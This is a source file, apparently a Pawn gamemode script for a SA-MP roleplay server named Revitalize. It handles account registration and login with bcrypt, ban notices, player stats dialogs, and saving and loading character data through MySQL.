stock ShowStats(playerid, targetid)
{
	new str[2060], header[232], curtime = gettime(), date[6], reg[6], Float:hp, Float:ar, cat[2060], time[3];
	TimestampToDate(UcpData[playerid][ucpTime], reg[2], reg[1], reg[0], reg[3], reg[4], reg[5]);
	TimestampToDate(curtime, date[2], date[1], date[0], date[3], date[4], date[5]);
	GetPlayerHealth(playerid, hp);
	GetPlayerArmour(playerid, ar);
	gettime(time[0], time[1], time[2]);
	format(header, sizeof(header), "{AFAFAF}%s %s %s %i | %02d:%02d:%02d", GetWeekDay(date[0], date[1], date[2]), GetDay(date[0]), GetMonthName(date[1]), date[2], time[0], time[1], time[2]);
	format(str, sizeof(str), "{F7FF00}In Character\n");
	strcat(cat, str);
	format(str, sizeof(str), "{FFFFFF}Name: [{C6E2FF}%s{FFFFFF}] ({FF8000}%d{FFFFFF}) | Gender: [{C6E2FF}%s{FFFFFF}] | Birthdate: [{C6E2FF}%s{FFFFFF}] | Money: [{009000}$%s{FFFFFF}] | Bank: [{009000}$%s{FFFFFF}]\n",
	PlayerData[playerid][pName], PlayerData[playerid][pID], Gender_Name[PlayerData[playerid][pGender]], PlayerData[playerid][pBirthdate], FormatNumber(GetMoney(playerid)), FormatNumber(PlayerData[playerid][pBank]));
	strcat(cat, str);
	format(str, sizeof(str), "Origin: [{C6E2FF}%s{FFFFFF}] | Number: [{C6E2FF}%d{FFFFFF}] | Job: [{C6E2FF}%s{FFFFFF}] | Faction: [{C6E2FF}%s{FFFFFF}] | Faction Rank: [{C6E2FF}%s{FFFFFF}]\n",
	PlayerData[playerid][pOrigin], PlayerData[playerid][pPhoneNumber], Job_Name[PlayerData[playerid][pJob]], Faction_GetName(playerid), Faction_GetRank(playerid));
	strcat(cat, str);
	format(str, sizeof(str), "\n{F7FF00}Out of Character\n");
	strcat(cat, str);
	format(str, sizeof(str), "{FFFFFF}Username: [{C6E2FF}%s{FFFFFF}] ({FF8000}%d{FFFFFF}) | Registration Date: [{C6E2FF}%s %s %s %i, %02d:%02d:%02d{FFFFFF}]\n",
	PlayerData[playerid][pUCP], UcpData[playerid][ucpID], GetWeekDay(reg[0], reg[1], reg[2]), GetDay(reg[0]), GetMonthName(reg[1]), reg[2], reg[3], reg[4], reg[5]);
	strcat(cat, str);
	format(str, sizeof(str), "Time Played: [{C6E2FF}%d hours %d minutes %d seconds{FFFFFF}] | Mask ID: [{C6E2FF}Mask_#%d{FFFFFF}]\n",
	PlayerData[playerid][pHour], PlayerData[playerid][pMinute], PlayerData[playerid][pSecond], PlayerData[playerid][pMaskID]);
	strcat(cat, str);
	format(str, sizeof(str), "Health: [{FF0000}%.2f/100.0{FFFFFF}] | Armour: [{C6E2FF}%.2f/100.0{FFFFFF}] | Interior: [{C6E2FF}%d{FFFFFF}] | Virtual World: [{C6E2FF}%d{FFFFFF}]",
	hp, ar, GetPlayerInterior(playerid), GetPlayerVirtualWorld(playerid));
	strcat(cat, str);
	ShowPlayerDialog(targetid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, header, cat, "Close", "");
	return 1;
}

stock CheckAccount(playerid)
{
	new query[256];
	mysql_format(sqlcon, query, sizeof(query), "SELECT * FROM `playerucp` WHERE `UCP` = '%s' LIMIT 1;", GetName(playerid));
	mysql_tquery(sqlcon, query, "CheckPlayerUCP", "d", playerid);
	return 1;
}

FUNC::PlayerCheck(playerid, rcc)
{
	if(rcc != g_RaceCheck{playerid})
	    return Kick(playerid);

    InterpolateCameraPos(playerid, -1.9223, -1240.7756, 117.9103, 1142.4589, -717.8170, 139.2966, 25000, CAMERA_MOVE);
	InterpolateCameraLookAt(playerid, 186.6470, -1261.1404, 78.2794, 1280.0114, -640.1159, 106.2128, 25000, CAMERA_MOVE);
	CheckAccount(playerid);
	SetPlayerColor(playerid, COLOR_GREY);
	SyncPlayerTime(playerid);
	return true;
}

FUNC::CheckPlayerUCP(playerid)
{
	new rows = cache_num_rows();
	new str[356];
	new banned, banby[24], banreason[32], bantime;
	new date[6], active;

	if (rows)
	{
	    cache_get_value_name(0, "UCP", tempUCP[playerid]);
	    cache_get_value_name_int(0, "Banned", banned);
	    cache_get_value_name(0, "BannedBy", banby);
	    cache_get_value_name(0, "BannedReason", banreason);
	    cache_get_value_name_int(0, "BannedTime", bantime);
	    cache_get_value_name_int(0, "Registered", UcpData[playerid][ucpTime]);
	    cache_get_value_name_int(0, "pID", UcpData[playerid][ucpID]);
	    cache_get_value_name_int(0, "Admin", UcpData[playerid][ucpAdmin]);
	    cache_get_value_name(0, "UCP",PlayerData[playerid][pUCP]);
	    cache_get_value_name_int(0, "Active", active);
	    cache_get_value_name_int(0, "code", tempCode[playerid]);
	    cache_get_value_name(0, "email", UcpData[playerid][ucpEmail]);
	    if(banned == 1)
	    {
	    	TimestampToDate(bantime, date[2], date[1], date[0], date[3], date[4], date[5]);
			new zstr[325];
			format(zstr, sizeof(zstr),"{FFFFFF}Your UCP has been Banned from this server\n{FF0000}Reason: {FFFFFF}%s\n{FF0000}Banned By: {FFFFFF}%s\n{FF0000}Banned Date: {FFFFFF}%i/%02d/%02d %02d:%02d\n{FFFFFF}For Unbanned please visit our discord at {FF0000}https://discord.gg/WQKYCW8pzQ", banreason, banby, date[2], date[0], date[1], date[3], date[4]);
			ShowPlayerDialog(playerid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{FFFFFF}Banned Alert - UCP Ban", zstr, "Close", "");	 
			KickEx(playerid);   	
	    }
	    else
	    {
		    format(str, sizeof(str), "{FFFFFF}Welcome back to Revitalize {FFFF00}%s\n{FFFFFF}Current IP: {FF0606}%s\n\n{FFFFFF}Kamu diberikan waktu {FFFF00}3 menit {FFFFFF}untuk memasukan password dan login atau akan dikick dari server\nSilahkan masukan password account anda pada kolom dibawah ini:", GetName(playerid), ReturnIP(playerid));
			ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "Login to Revitalize", str, "Login", "Exit");
			LoginTimer[playerid] = SetTimerEx("LoginTime", 180000, false, "d", playerid);
	    }
	}
	else
	{
	    format(str, sizeof(str), "{FFFFFF}Welcome Revitalize {FFFF00}%s\n{FFFFFF}Current IP: {FF0606}%s\n\n{FFFFFF}Nama account-mu tidak terdaftar dalam database.\nSilahkan masukan password dibawah ini untuk register:", GetName(playerid), ReturnIP(playerid));
		ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "Register to Revitalize", str, "Login", "Exit");
	}
	return 1;
}

stock SetupPlayerData(playerid)
{
	Inventory_Clear(playerid);
	PlayerData[playerid][pHealth] = 100.0;
    SetSpawnInfo(playerid, 0, PlayerData[playerid][pSkin], 1642.1681, -2333.3689, 13.5469, 0.0, 0, 0, 0, 0, 0, 0);
    SpawnPlayer(playerid);
    GiveMoney(playerid, 10000);
    PlayerData[playerid][pBank] = 15000;
    TogglePlayerControllable(playerid, 1);
    return 1;
}

stock SaveData(playerid)
{
	new query[2512];
	if(PlayerData[playerid][pSpawned])
	{
		GetPlayerHealth(playerid, PlayerData[playerid][pHealth]);
		GetPlayerArmour(playerid, PlayerData[playerid][pArmor]);

		GetPlayerPos(playerid, PlayerData[playerid][pPos][0], PlayerData[playerid][pPos][1], PlayerData[playerid][pPos][2]);

		mysql_format(sqlcon, query, sizeof(query), "UPDATE `characters` SET ");
		mysql_format(sqlcon, query, sizeof(query), "%s`PosX`='%f', ", query, PlayerData[playerid][pPos][0]);
        mysql_format(sqlcon, query, sizeof(query), "%s`PosY`='%f', ", query, PlayerData[playerid][pPos][1]);
        mysql_format(sqlcon, query, sizeof(query), "%s`PosZ`='%f', ", query, PlayerData[playerid][pPos][2]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Health`='%f', ", query, PlayerData[playerid][pHealth]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`World`='%d', ", query, GetPlayerVirtualWorld(playerid));
	    mysql_format(sqlcon, query, sizeof(query), "%s`Interior`='%d', ", query, GetPlayerInterior(playerid));
	    mysql_format(sqlcon, query, sizeof(query), "%s`Age`='%d', ", query, PlayerData[playerid][pAge]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Origin`='%s', ", query, PlayerData[playerid][pOrigin]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Gender`='%d', ", query, PlayerData[playerid][pGender]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Skin`='%d', ", query, PlayerData[playerid][pSkin]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Hunger`='%d', ", query, PlayerData[playerid][pHunger]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Thirst`='%d', ", query, PlayerData[playerid][pThirst]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`AdminLevel`='%d', ", query, PlayerData[playerid][pAdmin]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`InBiz`='%d', ", query, PlayerData[playerid][pInBiz]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`InHouse`='%d', ", query, PlayerData[playerid][pInHouse]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Money`='%d', ", query, PlayerData[playerid][pMoney]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Faction`='%d', ", query, PlayerData[playerid][pFaction]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`FactionRank`='%d', ", query, PlayerData[playerid][pFactionRank]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`FactionID`='%d', ", query, PlayerData[playerid][pFactionID]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Job`='%d', ", query, PlayerData[playerid][pJob]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`FactionSkin`='%d', ", query, PlayerData[playerid][pFactionSkin]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Onduty`='%d', ", query, PlayerData[playerid][pOnDuty]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Number`='%d', ", query, PlayerData[playerid][pPhoneNumber]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Armor`='%f', ", query, PlayerData[playerid][pArmor]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Salary`='%d', ", query, PlayerData[playerid][pSalary]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Bank`='%d', ", query, PlayerData[playerid][pBank]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Arrest`='%d', ", query, PlayerData[playerid][pArrest]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`JailTime`='%d', ", query, PlayerData[playerid][pJailTime]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`JailReason`='%s', ", query, PlayerData[playerid][pJailReason]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`JailBy`='%s', ", query, PlayerData[playerid][pJailBy]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`InDoor`='%d', ", query, PlayerData[playerid][pInDoor]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Injured`='%d', ", query, PlayerData[playerid][pInjured]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Credit`='%d', ", query, PlayerData[playerid][pCredit]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`BusDelay`='%d', ", query, PlayerData[playerid][pBusDelay]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Head`='%f', ", query, PlayerData[playerid][pDamages][0]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Torso`='%f', ", query, PlayerData[playerid][pDamages][1]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`RightArm`='%f', ", query, PlayerData[playerid][pDamages][2]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`LeftArm`='%f', ", query, PlayerData[playerid][pDamages][3]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`RightLeg`='%f', ", query, PlayerData[playerid][pDamages][4]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`LeftLeg`='%f', ", query, PlayerData[playerid][pDamages][5]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Groin`='%f', ", query, PlayerData[playerid][pDamages][6]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Healthy`='%f', ", query, PlayerData[playerid][pHealthy]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`SweeperDelay`='%d', ", query, PlayerData[playerid][pSweeperDelay]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`MaskID`='%d', ", query, PlayerData[playerid][pMaskID]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Birthdate`='%s', ", query, PlayerData[playerid][pBirthdate]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Exp`='%d', ", query, PlayerData[playerid][pExp]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Level`='%d', ", query, PlayerData[playerid][pLevel]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Hour`='%d', ", query, PlayerData[playerid][pHour]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Second`='%d', ", query, PlayerData[playerid][pSecond]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Paycheck`='%d', ", query, PlayerData[playerid][pPaycheck]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Minute`='%d', ", query, PlayerData[playerid][pMinute]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Channel`='%d', ", query, PlayerData[playerid][pChannel]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`FishDelay`='%d', ", query, PlayerData[playerid][pFishDelay]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Funds`='%d', ", query, PlayerData[playerid][pFunds]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`Quitjob`='%d', ", query, PlayerData[playerid][pQuitjob]);
	    mysql_format(sqlcon, query, sizeof(query), "%s`DrivingLicense`='%d', ", query, PlayerData[playerid][pLicense][0]);
		forex(i, 10)
		{
			mysql_format(sqlcon, query, sizeof(query), "%s`Fish%d` = '%.1f', `FishName%d` = '%s', ", query, i + 1, FishWeight[playerid][i], i + 1, FishName[playerid][i]);
		}
		forex(i, 13)
		{
			mysql_format(sqlcon, query, sizeof(query), "%s`Gun%d` = '%d', `Ammo%d` = '%d', `Durability%d` = '%d', ", query, i + 1, PlayerData[playerid][pGuns][i], i + 1, PlayerData[playerid][pAmmo][i], i + 1, PlayerData[playerid][pDurability][i], i + 1);
		}
		forex(i, 7)
		{
			mysql_format(sqlcon, query, sizeof(query), "%s`Bullet%d` = '%d', ", query, i + 1, PlayerData[playerid][pBullets][i]);
		}
	  //  mysql_format(sqlcon, query, sizeof(query), "%s`UCP`='%s' ", query, PlayerData[playerid][pUCP]);
		mysql_format(sqlcon, query, sizeof(query), "%s`Quitjob`='%d' ", query, PlayerData[playerid][pQuitjob]);
	    mysql_format(sqlcon, query, sizeof(query), "%sWHERE `pID` = %d", query, PlayerData[playerid][pID]);
		mysql_query(sqlcon, query, true);
	}
	return 1;
}

FUNC::LoadCharacterData(playerid)
{
	cache_get_value_name_int(0, "pID", PlayerData[playerid][pID]);
	cache_get_value_name(0, "Name", PlayerData[playerid][pName]);
	cache_get_value_name_float(0, "PosX", PlayerData[playerid][pPos][0]);
	cache_get_value_name_float(0, "PosY", PlayerData[playerid][pPos][1]);
	cache_get_value_name_float(0, "PosZ", PlayerData[playerid][pPos][2]);
	cache_get_value_name_float(0, "Health", PlayerData[playerid][pHealth]);
	cache_get_value_name_int(0, "Interior", PlayerData[playerid][pInterior]);
	cache_get_value_name_int(0, "World", PlayerData[playerid][pWorld]);
	cache_get_value_name_int(0, "Age", PlayerData[playerid][pAge]);
	cache_get_value_name(0, "Origin", PlayerData[playerid][pOrigin]);
	cache_get_value_name_int(0, "Gender", PlayerData[playerid][pGender]);
	cache_get_value_name_int(0, "Skin", PlayerData[playerid][pSkin]);
	//cache_get_value_name(0, "UCP", PlayerData[playerid][pUCP]);
	cache_get_value_name_int(0, "Hunger", PlayerData[playerid][pHunger]);
	cache_get_value_name_int(0, "AdminLevel", PlayerData[playerid][pAdmin]);
	cache_get_value_name_int(0, "InBiz", PlayerData[playerid][pInBiz]);
	cache_get_value_name_int(0, "InHouse", PlayerData[playerid][pInHouse]);
	cache_get_value_name_int(0, "Money", PlayerData[playerid][pMoney]);
	cache_get_value_name_int(0, "Thirst", PlayerData[playerid][pThirst]);
	cache_get_value_name_int(0, "Job", PlayerData[playerid][pJob]);
	cache_get_value_name_int(0, "Number", PlayerData[playerid][pPhoneNumber]);
	cache_get_value_name_int(0, "Faction", PlayerData[playerid][pFaction]);
	cache_get_value_name_int(0, "FactionRank", PlayerData[playerid][pFactionRank]);
	cache_get_value_name_int(0, "FactionID", PlayerData[playerid][pFactionID]);
	cache_get_value_name_int(0, "FactionSkin", PlayerData[playerid][pFactionSkin]);
	cache_get_value_name_int(0, "Onduty", PlayerData[playerid][pOnDuty]);
	cache_get_value_name(0, "Birthdate", PlayerData[playerid][pBirthdate], 24);
	cache_get_value_name_float(0, "Armor", PlayerData[playerid][pArmor]);
	cache_get_value_name_int(0, "Salary", PlayerData[playerid][pSalary]);
	cache_get_value_name_int(0, "Bank", PlayerData[playerid][pBank]);
	cache_get_value_name_int(0, "Credit", PlayerData[playerid][pCredit]);
	cache_get_value_name_int(0, "InDoor", PlayerData[playerid][pInDoor]);
	cache_get_value_name_int(0, "Arrest", PlayerData[playerid][pArrest]);
	cache_get_value_name_int(0, "JailTime", PlayerData[playerid][pJailTime]);
	cache_get_value_name(0, "JailReason", PlayerData[playerid][pJailReason]);
	cache_get_value_name(0, "JailBy", PlayerData[playerid][pJailBy]);
	cache_get_value_name_int(0, "Injured", PlayerData[playerid][pInjured]);
	cache_get_value_name_int(0, "SweeperDelay", PlayerData[playerid][pSweeperDelay]);
	cache_get_value_name_int(0, "BusDelay", PlayerData[playerid][pBusDelay]);
	cache_get_value_name_int(0, "MaskID", PlayerData[playerid][pMaskID]);
	cache_get_value_name_float(0, "Head", PlayerData[playerid][pDamages][0]);
	cache_get_value_name_float(0, "Torso", PlayerData[playerid][pDamages][1]);
	cache_get_value_name_float(0, "RightArm", PlayerData[playerid][pDamages][2]);
	cache_get_value_name_float(0, "LeftArm", PlayerData[playerid][pDamages][3]);
	cache_get_value_name_float(0, "RightLeg", PlayerData[playerid][pDamages][4]);
	cache_get_value_name_float(0, "LeftLeg", PlayerData[playerid][pDamages][5]);
	cache_get_value_name_float(0, "Groin", PlayerData[playerid][pDamages][6]);
	cache_get_value_name_float(0, "Healthy", PlayerData[playerid][pHealthy]);
	cache_get_value_name_int(0, "Level", PlayerData[playerid][pLevel]);
	cache_get_value_name_int(0, "Exp", PlayerData[playerid][pExp]);
	cache_get_value_name_int(0, "Second", PlayerData[playerid][pSecond]);
	cache_get_value_name_int(0, "Hour", PlayerData[playerid][pHour]);
	cache_get_value_name_int(0, "Minute", PlayerData[playerid][pMinute]);
	cache_get_value_name_int(0, "Paycheck", PlayerData[playerid][pPaycheck]);
	cache_get_value_name_int(0, "Quitjob", PlayerData[playerid][pQuitjob]);
	cache_get_value_name_int(0, "Channel", PlayerData[playerid][pChannel]);
	cache_get_value_name_int(0, "Funds", PlayerData[playerid][pFunds]);
	cache_get_value_name_int(0, "DrivingLicense", PlayerData[playerid][pLicense][0]);
	cache_get_value_name_int(0, "FishDelay", PlayerData[playerid][pFishDelay]);
	forex(i, 7)
	{
		new lquery[128];
		format(lquery, sizeof(lquery), "Bullet%d", i + 1);
		cache_get_value_name_int(0, lquery, PlayerData[playerid][pBullets][i]);
	}
	forex(i, 13)
	{
	    new zquery[256];
	    format(zquery, sizeof(zquery), "Gun%d", i + 1);
	    cache_get_value_name_int(0,zquery,PlayerData[playerid][pGuns][i]);

	    format(zquery, sizeof(zquery), "Ammo%d", i + 1);
	    cache_get_value_name_int(0,zquery,PlayerData[playerid][pAmmo][i]);


	    format(zquery, sizeof(zquery), "Durability%d", i + 1);
	    cache_get_value_name_int(0,zquery,PlayerData[playerid][pDurability][i]);
	}
    for(new i = 0; i < 10; i++)
    {
		new zquery[256];
		format(zquery, sizeof(zquery), "Fish%d", i + 1);
		cache_get_value_name_float(0, zquery, FishWeight[playerid][i]);

		format(zquery, sizeof(zquery), "FishName%d", i + 1);
		cache_get_value_name(0, zquery, FishName[playerid][i]);
	}
	new invQuery[256];
	new contactQuery[256];

	new ticketQuery[256];
	new accQuery[256];


	new string[128];
	mysql_format(sqlcon, string, sizeof(string), "SELECT * FROM weaponsettings WHERE Owner = '%d'", PlayerData[playerid][pID]);
	mysql_tquery(sqlcon, string, "OnWeaponsLoaded", "d", playerid);

	mysql_format(sqlcon, ticketQuery, sizeof(ticketQuery), "SELECT * FROM `tickets` WHERE `ID` = '%d'", PlayerData[playerid][pID]);
	mysql_tquery(sqlcon, ticketQuery, "LoadPlayerTicket", "d", playerid);

    mysql_format(sqlcon,invQuery, sizeof(invQuery), "SELECT * FROM `inventory` WHERE `ID` = '%d'", PlayerData[playerid][pID]);
	mysql_tquery(sqlcon, invQuery, "LoadPlayerItems", "d", playerid);

	mysql_format(sqlcon, contactQuery, sizeof(contactQuery), "SELECT * FROM `contacts` WHERE `ID` = %d", PlayerData[playerid][pID]);
	mysql_tquery(sqlcon, contactQuery, "LoadPlayerContact", "d", playerid);

	mysql_format(sqlcon, accQuery, sizeof(accQuery), "SELECT * FROM `toys` WHERE `Owner` = '%s'", PlayerData[playerid][pName]);
	mysql_query(sqlcon, accQuery, true);
	if(!cache_num_rows())
	{
		CreatePlayerToy(playerid);
	}
    SetSpawnInfo(playerid, 0, PlayerData[playerid][pSkin], PlayerData[playerid][pPos][0], PlayerData[playerid][pPos][1], PlayerData[playerid][pPos][2], 0.0, 0, 0, 0, 0, 0, 0);
    SpawnPlayer(playerid);
    SendClientMessageEx(playerid, -1, "Successfully loaded your characters database in {FF0000}%dms", GetPlayerPing(playerid));
    LoadPlayerVehicle(playerid);
	LoadPlayerToys(playerid);

	PlayerData[playerid][pLogged] = true;
    return 1;
}

FUNC::HashPlayerPassword(playerid, hashid)
{
	new
		query[256],
		hash[BCRYPT_HASH_LENGTH];

    bcrypt_get_hash(hash, sizeof(hash));

	GetPlayerName(playerid, tempUCP[playerid], MAX_PLAYER_NAME + 1);

	mysql_format(sqlcon, query,sizeof(query),"INSERT INTO `playerucp` (`UCP`, `Password`, `Registered`) VALUES ('%s', '%s', '%d')", tempUCP[playerid], hash, gettime());
	mysql_query(sqlcon, query, true);

	UcpData[playerid][ucpID] = cache_insert_id();


    SendServerMessage(playerid, "Your UCP is successfully registered!");
    CheckAccount(playerid);
	return 1;
}

stock HideCharacter(playerid)
{
	forex(i, 5)
	{
		PlayerTextDrawHide(playerid, UCPTD[playerid][i]);
	}
	forex(i, 3)
	{
		PlayerTextDrawHide(playerid, CHARTD[playerid][i]);
	}
	CancelSelectTextDraw(playerid);
	return 1;
}
stock ShowCharacterList(playerid)
{
	SelectTextDraw(playerid, COLOR_YELLOW);
	//new name[256], count, sgstr[128];
	forex(i, 5)
	{
		PlayerTextDrawShow(playerid, UCPTD[playerid][i]);
	}
	forex(i, MAX_CHARS)
	{
		PlayerTextDrawShow(playerid, CHARTD[playerid][i]);
		PlayerTextDrawSetString(playerid, CHARTD[playerid][i], sprintf("%s", (PlayerChar[playerid][i][0] == EOS) ? ("Empty_Slot") : (PlayerChar[playerid][i])));
	}
	return 1;
}

FUNC::LoadCharacter(playerid)
{
	for (new i = 0; i < MAX_CHARS; i ++)
	{
		PlayerChar[playerid][i][0] = EOS;
	}
	for (new i = 0; i < cache_num_rows(); i ++)
	{
		cache_get_value_name(i, "Name", PlayerChar[playerid][i]);
	}
  	ShowCharacterList(playerid);
  	return 1;
}

FUNC::OnPlayerPasswordChecked(playerid, bool:success)
{
	new str[256];
    format(str, sizeof(str), "{FFFFFF}Welcome back to Revitalize {FFFF00}%s\n{FFFFFF}Current IP: {FF0606}%s\n\n{FFFFFF}Kamu diberikan waktu {FFFF00}3 menit {FFFFFF}untuk memasukan password dan login atau akan dikick dari server\nSilahkan masukan password account anda pada kolom dibawah ini:\n\n{FF6347}ATTEMPT: {FFFFFF}Kesempatan login teersisa {FFFF00}%d{FFFFFF}/{FF0000}3 {FFFFFF}kali lagi.", GetName(playerid), ReturnIP(playerid));
    
	if(!success)
	{
	    if(PlayerData[playerid][pAttempt] < 5)
	    {
		    PlayerData[playerid][pAttempt]++;
	        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "Login to Revitalize", str, "Login", "Exit");
		}
		else
		{
		    SendServerMessage(playerid, "Kamu telah salah memasukan password sebanyak {FFFF00}3 kali!");
		    KickEx(playerid);
		}
	}
	else
	{
		new query[256];
		mysql_format(sqlcon, query, sizeof(query), "SELECT `Name` FROM `characters` WHERE `UCP` = '%s' LIMIT %d;", GetName(playerid), MAX_CHARS);
		mysql_tquery(sqlcon, query, "LoadCharacter", "d", playerid);
	}
	return 1;
}

FUNC::InsertPlayerName(playerid, name[])
{
	new count = cache_num_rows();
	if(count > 0)
	{
        ShowPlayerDialog(playerid, DIALOG_MAKECHAR, DIALOG_STYLE_INPUT, "Character Name", "ERROR: This name is already used by the other player!\nInsert your Character Name\n\nExample: Finn_Xanderz, Javier_Cooper etc.", "Submit", "Cancel");
	}
	else
	{
		format(PlayerData[playerid][pTempName], MAX_PLAYER_NAME, name);
		PlayerTextDrawSetString(playerid, NAMETD[playerid], sprintf("%s", PlayerData[playerid][pTempName]));
		SelectTextDraw(playerid, COLOR_YELLOW);
	}
	return 1;
}

stock ReturnName(playerid)
{
    static
        name[MAX_PLAYER_NAME + 1];

    GetPlayerName(playerid, name, sizeof(name));
    if(PlayerData[playerid][pMasked])
    {
        format(name, sizeof(name), "Mask_#%d", PlayerData[playerid][pMaskID]);
	}
	else
	{
	    for (new i = 0, len = strlen(name); i < len; i ++)
		{
	        if (name[i] == '_') name[i] = ' ';
		}
	}
    return name;
}

stock ReturnIP(playerid)
{
	static
	    ip[16];

	GetPlayerIp(playerid, ip, sizeof(ip));
	return ip;
}

stock GetName(playerid)
{
	new name[MAX_PLAYER_NAME];
 	GetPlayerName(playerid,name,sizeof(name));
	return name;
}

stock ResetVariable(playerid)
{
	format(TagFont[playerid], 24, "Arial");
	TagSize[playerid] = 24;
	TagBold[playerid] = 0;
	TagColor[playerid] = 0xFFFFFFFF;
	PlayerData[playerid][pTogBuy] = true;
	PlayerData[playerid][pTogHud] = false;
	PlayerData[playerid][pTogAnim] = false;
	PlayerData[playerid][pTogPM] = false;
	PlayerData[playerid][pTogLogin] = false;
	PlayerData[playerid][pTogGlobal] = false;
	PlayerData[playerid][pDutyTime] = 3600;
	PlayerData[playerid][pDragOffer] = INVALID_PLAYER_ID;
	PlayerData[playerid][pFishing] = false;
	PlayerData[playerid][pFishDelay] = 0;
	PlayerData[playerid][pLogged] = false;
	PlayerData[playerid][pTaxiCalled] = false;
	PlayerData[playerid][pInterior] = 0;
	PlayerData[playerid][pInTuning] = false;
	PlayerData[playerid][pSeatbelt] = false;
	PlayerData[playerid][pEditGate] = 0;
	PlayerData[playerid][pAdmin] = 0;
	PlayerMedia[playerid][samLogged] = false;
	format(PlayerMedia[playerid][samName], MAX_PLAYER_NAME, "");
	PlayerData[playerid][pHaveDrivingLicense] = false;
	PlayerData[playerid][pOnTest] = false;
	PlayerData[playerid][pIndexTest] = 0;
	PlayerData[playerid][pVehicleDMV] = INVALID_VEHICLE_ID;
	PlayerData[playerid][pOnDMV] = false;
	PlayerData[playerid][pAFK] = 0;
	PlayerData[playerid][pIndexDMV] = -1;
	PlayerData[playerid][pWeapon] = 0;
	PlayerData[playerid][pFunds] = false;
	PlayerData[playerid][pTazed] = false;
	PlayerData[playerid][pTazer] = false;
	PlayerData[playerid][pAxe] = false;
	WeaponTick[playerid] = 0;
	EditingWeapon[playerid] = 0;
	PlayerData[playerid][pCutting] = -1;
	PlayerData[playerid][pEditing] = -1;
	PlayerData[playerid][pEditType] = -1;
	PlayerData[playerid][pFirstAid] = false;
	PlayerData[playerid][pAduty] = false;
	PlayerData[playerid][pVendor] = -1;
	PlayerData[playerid][pChannel] = 0;
	PlayerData[playerid][pArmor] = 0.0;
	PlayerData[playerid][pQuitjob] = 0;
	PlayerData[playerid][pMinutes] = 0;
	PlayerData[playerid][pDutySecond] = 0;
	PlayerData[playerid][pDutyMinute] = 0;
	PlayerData[playerid][pDutyHour] = 0;
	PlayerData[playerid][pFrisked] = INVALID_PLAYER_ID;
	IsDragging[playerid] = INVALID_PLAYER_ID;
	PlayerData[playerid][pSpectator] = INVALID_PLAYER_ID;
	PlayerData[playerid][pInHouse] = -1;
	Falling[playerid] = false;
	PlayerData[playerid][pHour] = 0;
	PlayerData[playerid][pPaycheck] = 0;
	PlayerData[playerid][pMinute] = 0;
	PlayerData[playerid][pSecond] = 0;
	PlayerData[playerid][pLevel] = 1;
	PlayerData[playerid][pExp] = 0;
	PlayerData[playerid][pMasked] = false;
	PlayerData[playerid][pSelecting] = -1;
	PlayerData[playerid][pEditingItem] = -1;
	PlayerPressedJump[playerid] = 0;
	PlayerData[playerid][pMaskID] = 0;
	PlayerData[playerid][pHealthy] = 100.0;
	PlayerData[playerid][pTargetid] = INVALID_PLAYER_ID;
	PlayerData[playerid][pCallLine] = INVALID_PLAYER_ID;
	PlayerData[playerid][pIncomingCall] = 0;
	PlayerData[playerid][pCredit] = 0;
	PlayerData[playerid][pPhoneNumber] = 0;
	tempCode[playerid] = 0;
	ServiceIndex[playerid] = 0;
	PlayerData[playerid][pCuffed] = false;
	SweeperIndex[playerid] = -1;
	PlayerData[playerid][pInjuredTime] = 600;
	OnSweeping[playerid] = false;
	PlayerData[playerid][pBusDelay] = 0;
	PlayerData[playerid][pSweeperDelay] = 0;
	PlayerData[playerid][pDead] = false;
	PlayerData[playerid][pInjured] = false;
	PlayerData[playerid][pArrest] = false;
